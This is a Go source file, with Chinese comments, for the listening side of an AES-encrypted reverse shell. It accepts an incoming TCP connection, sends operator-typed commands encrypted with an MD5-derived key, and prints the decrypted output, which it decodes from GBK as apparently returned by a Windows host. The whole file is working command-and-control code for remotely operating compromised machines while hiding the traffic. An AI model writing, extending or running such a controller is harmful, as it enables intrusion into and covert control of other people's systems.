package main

import (
	"bufio"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"os"
	"strings"

	aesplug "golang.com/golang.com/aesPlug"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Usage:127.0.0.1:9999 aeskey")
		os.Exit(1) //0表示正常退出，其他表示异常
	}
	ipAddr := os.Args[1]
	aesKey := os.Args[2]
	newAesKey := hashMD5(aesKey)
	listener, err := net.Listen("tcp", ipAddr)
	if err != nil {
		log.Fatal("Failed to create listener", err)
	}
	fmt.Println("enable listener:", ipAddr)

	//等待连接
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatal("Connection failed", err)
		}

		go shellHandle(conn, newAesKey)
		writeCommand(conn, newAesKey)
	}

}

func writeCommand(conn net.Conn, newAesKey string) {
	//扫描用户的标准输入
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		command := scanner.Text()
		if strings.TrimSpace(command) == "exit" {
			conn.Close()
			fmt.Println("Client exiting...")
			break
		}
		ciphertext := aesplug.EncryptAES([]byte(newAesKey), command)
		_, err := fmt.Fprintln(conn, ciphertext)
		if err != nil {
			log.Fatal("Command sending failed")
		}
	}
}

func shellHandle(conn net.Conn, newAesKey string) {
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		ciphertext := scanner.Text()
		fmt.Println("result密文:", ciphertext)
		plaintext := aesplug.DecryptAES([]byte(newAesKey), ciphertext)
		result, err := convertToUTF8([]byte(plaintext))
		if err != nil {
			fmt.Println("Error converting to UTF-8:", err)
			break
		}
		fmt.Println(result)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading from server:", err)
	}
}

func convertToUTF8(input []byte) (string, error) {
	output, _, err := transform.String(simplifiedchinese.GBK.NewDecoder(), string(input))
	if err != nil {
		return "", err
	}
	return output, nil
}

func hashMD5(input string) string {
	// 创建一个MD5哈希对象
	hasher := md5.New()

	// 将字符串写入哈希对象
	hasher.Write([]byte(input))

	// 计算MD5散列值
	hash := hasher.Sum(nil)

	// 将散列值转换为十六进制字符串并返回
	hashString := hex.EncodeToString(hash)
	return hashString
}
